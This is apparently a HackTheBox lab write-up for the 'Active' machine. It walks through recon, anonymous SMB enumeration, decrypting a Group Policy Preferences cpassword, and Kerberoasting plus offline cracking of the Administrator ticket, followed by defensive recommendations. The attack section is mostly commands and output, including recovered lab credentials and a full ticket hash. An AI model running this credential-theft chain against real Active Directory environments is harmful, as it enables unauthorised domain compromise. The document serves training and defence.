---
title: "Active Walkthrough — HTB"
date: 2025-10-05 13:00:00 
categories: [red-teaming]
tags:
- HTB
- Kerberoasting
- CVE-2014-1812
description: "Walkthrough for HTB 'Active' machine — Recon, Enumeration, Exploitation and Privilege Escalation."
---

## Summary

This walkthrough documents the discovery-to-root flow on the **HTB Active** machine. We begin with focused network recon (Nmap) and pivot into SMB enumeration on a Windows domain host. Access to the domain `SYSVOL` share exposes legacy **Group Policy Preferences (GPP)** artifacts — primarily `Groups.xml` — which historically could embed a reversible-crypto field called **`cpassword`**. While `cpassword` appears encrypted, it is **not** a secure secret store and has been deprecated for years, yet it still turns up in real environments (and labs) and remains a valuable detection signal for defenders.

**Key takeaways**
- Targeted SMB enumeration frequently uncovers **high-value domain artifacts** (e.g., `SYSVOL`, `NETLOGON`) that accelerate initial access.  
- Legacy **GPP `Groups.xml`** entries are still found in the wild; a quick hunt for **`cpassword`** provides **low-noise, high-signal** findings for blue teams and a critical pivot for red teams.  
- For responsible handling: **detect** GPP credential artifacts, **remove** them from SYSVOL/backups, and **rotate** any impacted credentials immediately.

### Scope & Notes

Active is an easy to medium difficulty machine, which features the use of multiple enumeration techniques and a misconfiguration involving Group Policy Preferences (GPP). The walkthrough demonstrates common attacker workflows (Nmap → SMB → SYSVOL → credential artifacts) and defensive angles (detection/cleanup) to gain privileges within an Active Directory environment.

## Active Recon:

### Host Discovery:
The host is up and running. After enumerating top TCP ports with Nmap, I found interesting details such as the domain **active.htb**, and noted a few important ports open — **SMB (445)** and **LDAP (389/3268)**.

```powershell
> sudo nmap -sn 10.129.235.185 -oA host_alive
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-17 01:59 EDT
Nmap scan report for 10.129.235.185
Host is up (0.17s latency).
Nmap done: 1 IP address (1 host up) scanned in 0.18 seconds

```

### Top-Ports Quick Scan - Version & OS Detection

```powershell
> sudo nmap -T4 -Pn -n -A 10.129.235.185
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-17 02:18 EDT
Nmap scan report for 10.129.235.185
Host is up (0.37s latency).
Not shown: 982 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-17 06:18:30Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=9/17%OT=53%CT=1%CU=39731%PV=Y%DS=2%DC=T%G=Y%TM=68CA
OS:5328%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=109%TS=7)SEQ(SP=104%GCD=
OS:1%ISR=109%CI=I%II=I%TS=7)SEQ(SP=104%GCD=1%ISR=109%TI=I%CI=I%TS=7)SEQ(SP=
OS:104%GCD=1%ISR=109%TI=RD%CI=I%TS=7)SEQ(SP=104%GCD=1%ISR=109%TI=RD%CI=I%II
OS:=I%TS=7)OPS(O1=M542NW8ST11%O2=M542NW8ST11%O3=M542NW8NNT11%O4=M542NW8ST11
OS:%O5=M542NW8ST11%O6=M542ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%
OS:W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M542NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S
OS:=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%R
OS:D=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=
OS:0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID
OS:=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-09-17T06:20:01
|_  start_date: 2025-09-17T03:26:25
|_clock-skew: -3s

TRACEROUTE (using port 554/tcp)
HOP RTT       ADDRESS
1   342.86 ms 10.10.16.1
2   343.03 ms 10.129.235.185

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 125.99 seconds

```

## Initial Access

Leveraging **enum4linux** to enumerate shares and permissions over a **null session** on the remote host.

*The following command uses a null session to list available shares and their permissions.*

### SMB / NetBIOS (Null Session Enum)

```powershell
> enum4linux -a 10.129.235.185
[+] Server 10.129.235.185 allows sessions using username '', password '' 
[+] Got OS info for 10.129.235.185 from srvinfo:                         
        10.129.235.185 Wk Sv PDC Tim NT     Domain Controller            
        platform_id     :       500
        os version      :       6.1
        server type     :       0x80102b
[+] Attempting to map shares on 10.129.235.185                           
                                                                         
//10.129.235.185/ADMIN$ Mapping: DENIED Listing: N/A Writing: N/A        
//10.129.235.185/C$     Mapping: DENIED Listing: N/A Writing: N/A
//10.129.235.185/IPC$   Mapping: OK Listing: DENIED Writing: N/A
//10.129.235.185/NETLOGON       Mapping: DENIED Listing: N/A Writing: N/A
//10.129.235.185/Replication    Mapping: OK Listing: OK Writing: N/A
//10.129.235.185/SYSVOL Mapping: DENIED Listing: N/A Writing: N/A
//10.129.235.185/Users  Mapping: DENIED Listing: N/A Writing: N/A
```

From the **netexec** output, it’s evident that we are interacting with a **Windows 7 / Server 2008** family target.

```powershell
> netexec smb 10.129.235.185         
SMB         10.129.235.185  445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)

```

Next, I used **netexec**’s **`spider_plus`** module to recursively list and download folders/sub-folders using the available **READ** permissions for **anonymous/NULL** users.

```powershell
netexec smb 10.129.235.185 -u "" -p "" -M spider_plus -o DOWNLOAD_FLAG=True
```

![image.png]({{ '/assets/img/Active/image.png' | relative_url }})

### GPP Discovery (Groups.xml in SYSVOL)

```powershell
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

As shown in the XML snippet above, I identified a **`cpassword`** field inside **Groups.xml** under **SYSVOL**, indicating legacy Group Policy Preferences credentials are present.

*What is CPassword?*

*Group Policy Preferences (GPP) once let admins mass-deploy local users and groups to Windows machines without touching each box. When a local user was defined in a GPO, the setting was saved to SYSVOL as XML (e.g., `Groups.xml`). Because a password had to be included, GPP stored it as an encrypted `cpassword` value that clients decrypted during group-policy refresh and then wrote into the local SAM. This made large-scale administration easy and required no lookup at logon—the password was already set on the endpoint.*

*The flaw was that `cpassword` used a fixed, publicly known AES key and SYSVOL is broadly readable to domain users. That meant anyone who could read the XML could decrypt the password offline, and if the same local admin was pushed everywhere, it became a lateral-movement goldmine. In 2014, Microsoft shipped MS14-025 and removed the ability to set passwords via GPP for Local Users & Groups (and similar items). The update didn’t delete old XMLs, so any legacy `cpassword` left in SYSVOL remains exploitable until removed and the exposed credentials are rotated.*

*Today, `Groups.xml` can still exist when you use GPP → Local Users and Groups, but it no longer contains passwords—it carries only instructions like create/rename/disable a local account or modify local group membership. If you want “helpdesk can sign in to any box,” use supported replacements instead of pushing a shared local password. The simplest pattern is to rely on domain identities: place a domain group like `IT-Helpdesk` into each computer’s local Administrators via GPO and let Kerberos handle authentication.*

The `cpassword` value is **reversibly encrypted** with a **publicly known AES key** (documented by Microsoft). So if an attacker can read the XML, they can recover the underlying **cleartext password**.

### Credential Recovery (gpp-decrypt of cpassword)

Exploiting the cpassword with publicly available utility “gpp-decrypt” 

```powershell
> gpp-decrypt  "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"                                         
GPPstillStandingStrong2k18
```

With `Groups.xml` confirming a `cpassword`, I decrypted it and used the recovered **service account** to enumerate SMB shares.

![image.png]({{ '/assets/img/Active/image%201.png' | relative_url }})

From the output, the host reports **Windows 7 / Server 2008 R2**, and `SVC_TGS` has **READ** access to high-value shares like **NETLOGON**, **Replication**, **SYSVOL**, and **Users**—ideal for pulling policy files and credentials.

### Establishing Foothold with SVC_TGS

Logging into the SMB share

```c
└─$ smbclient //10.129.236.69/C$ -U "active.htb\SVC_TGS"
Password for [ACTIVE.HTB\SVC_TGS]:
Try "help" to get a list of possible commands.
smb: \> 
```

Accessing & downloading files at user’s desktop gives us user flag

## Privilege escalation

Enumerating users with the compromised credentials. It revealed that there are SVC_TGS, KRBTGT (Domain account), Guest, Administrator (Interesting)

With the recovered **SVC_TGS** credentials, I first enumerated domain users and then hunted for **SPNs** to perform **Kerberoasting**.

1. Enumerate domain users with the compromised host

```c
> sudo crackmapexec smb 10.129.236.69 --users -u "svc_tgs" -p "GPPstillStandingStrong2k18"
SMB         10.129.236.69   445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.129.236.69   445    DC               [+] active.htb\svc_tgs:GPPstillStandingStrong2k18 
SMB         10.129.236.69   445    DC               [+] Enumerated domain user(s)
SMB         10.129.236.69   445    DC               active.htb\SVC_TGS                        badpwdcount: 0 desc: 
SMB         10.129.236.69   445    DC               active.htb\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account
SMB         10.129.236.69   445    DC               active.htb\Guest                          badpwdcount: 0 desc: Built-in account for guest access to the computer/domain
SMB         10.129.236.69   445    DC               active.htb\Administrator                  badpwdcount: 0 desc: Built-in account for administering the computer/domain

```

This confirmed users such as **SVC_TGS**, **krbtgt**, **Guest**, and **Administrator** (note the target OS banner: Windows 7 / Server 2008 R2).

1. Check for users with Service Principal Names (SPNs)

![image.png]({{ '/assets/img/Active/image%202.png' | relative_url }})

Above command reveals that the user “Administrator” has SPN associated with it.

Fetching the TGS of the user “Administrator”

The output shows that  **Administrator** has an SPN associated. This means we can **request a TGS** for that SPN and capture a crackable **Kerberos TGS-REP** hash.

```c
$ python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip 10.129.236.69 active.htb/svc_tgs -request
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2025-10-05 02:43:56.034568             

[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$32aa2efc41df15fc6ab7e29bb2610247$993a06fd928ec36eef67366be99c63ceadf9c1d83f9a4b8eb1eb9fba7f005207a8475f7693ef34a43178cb6f0a2f84042330a9d7e65bdae77b0b6da81efeee4c2ffbc5c2570e9a73b29c157a2c8302a71abaf62219c9baf0b1fe565ed5d93f84c207c0c67d4c9578b0cc61efb97d429cdb160c46462c882844e17010d8a442a01c8a05be847d37f106a38a94cd71215435ba2bb1667bbcb41d1feb861a02eaf06cb6b9bcb880e06821ccccaf4ec2b0112c60d5d6402afcfcabab378d320a00016915c4f10922e0c6dee70dae188299dd755ace5c69cc1e57ee46e0b9ea9a92e973863090d5dab9bec3a981d8ca16ffb3fc18d6fd4a19f18ba8448cfdcf35c2be9ab6115f88b92f800970f761c19f690ee4f4c6fb1d6c9f2a8bd495df0701158f7724a3d5217f4ff3155407a0653caf262f2d3793c9e9b5c240179dad62f2c61f0582b1cbcb6abb0c6e7835eaa54291df62f71ffa528963034fcaed90a1731242a8fe5201616a473708c514d046775fd65bd27bd952d4140eff41cf5c1f403586fc66af4f0201ebb9399dab0c3503a0ad6828e2b5b4a10013a970aee47d068fc39f22ea5aee02659462c36d1c4869a41de178cb71289baea10712410c288e8bce2510a9626fe0d262a392bfdd71d196529fbfcd695517bbcceb61a4683a8a88a00d404f42143c824d83042b64b23929cdebb13ae9c83d8ec4965af9471a3423cd1373c95a855d7d762d1c2f57a7b504da38a181f2d006c951fe93b0e2009e644816df2a8d1c10623a8aa4d4fbf787bd6b3e62492a8feee0d3028e11993e7f9711f7c1ca8a73d289b021225791799a36bb6b8b1c04dda61104bf9e72ce47eda812c3b937f473b7ca49cde8f15371c11b3028222a578f3bbc03c07a1e806a2af2e9503eb07bbea48be8353f3a3bb1fa8e7a56d294bb59ea319cc483af9fb3799b290609497a7a1a7d0e7664e6646dcd8174cf6fd6239432cb03093d549eee9ea37615380cb1a7bacd0942d30dc79b5c0509f90c86fb66dfffde23e98f9232791ac4db86ccc49f9e44414126512018b806e101812ba6277b5255b21dabccaa6806ac5a0fdf46d921de6742a141820773942f483ab43fb6de5770ba47a3c3c349fd345577f5c30160a8046f195d27abc753ccbadfd2fa7a2466590ea965ad0e48f9baa67b8620a3f2796ab0dcb536edf2e8a11be304c53b09cca7a0d809edc0fc7e6d0e2dc8b337e558a1930c28ab86ee73a092a72f1cba5529478c62
```

### Cracking the TGS-REP Hash

With the TGS-REP hash saved, I cracked it using **john** with the `rockyou.txt` wordlist.

```c
─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs tgs_Admin.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)     
1g 0:00:00:06 DONE (2025-10-05 03:31) 0.1628g/s 1716Kp/s 1716Kc/s 1716KC/s Tiffani1432..Thrash1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

### Administrator Access & Flags

Logging into C$ share leveraging smbclient

```c
└─$ smbclient //10.129.236.69/C$ -U "active.htb\administrator"
Password for [ACTIVE.HTB\administrator]:
Try "help" to get a list of possible commands.
smb: \> 

```

Retrieving the flag

```c
smb: \Users\Administrator\Desktop\> ls
  .                                  DR        0  Thu Jan 21 11:49:47 2021
  ..                                 DR        0  Thu Jan 21 11:49:47 2021
  desktop.ini                       AHS      282  Mon Jul 30 09:50:10 2018
  root.txt                           AR       34  Sun Oct  5 02:43:53 2025

```

## Recommendations (Keep it simple)

- **Remove GPP passwords**: Delete any `Groups.xml` (or other GPP XML) that contains `cpassword` from `\\<domain>\SYSVOL\…`.  
- **Rotate credentials**: Immediately change any accounts found in GPP (service + local admin).  
- **Use LAPS / gMSA**: Manage local admin passwords with **LAPS** and services with **gMSA** instead of static passwords.  
- **Harden service accounts**: Long, random passwords; **AES-only** encryption; **no delegation**; minimal rights; unique per service.  
- **Reduce Kerberoast risk**: Prefer **Managed Service Accounts**, enforce **AES** ciphers, disable RC4 where possible, and avoid giving SPNs to high-privilege users (like Administrator).  
- **Monitor SYSVOL**: Alert on creation/modification of `*\\SYSVOL\\*\\*.xml` containing `cpassword`.  
- **Patch & retire old OS**: Move off **Server 2008 R2 / Windows 7**; apply all DC/AD hardening baselines.  
- **SMB hygiene**: Disable **SMBv1**, require **SMB signing** where feasible, and restrict anonymous/NULL sessions.  
- **Least privilege & segmentation**: Keep admin tasks on admin workstations; segment DCs and management subnets.  
- **SIEM hunting**: Add a rule to flag reads of `*\\SYSVOL\\*\\Groups.xml` and spikes in **TGS requests** for sensitive SPNs.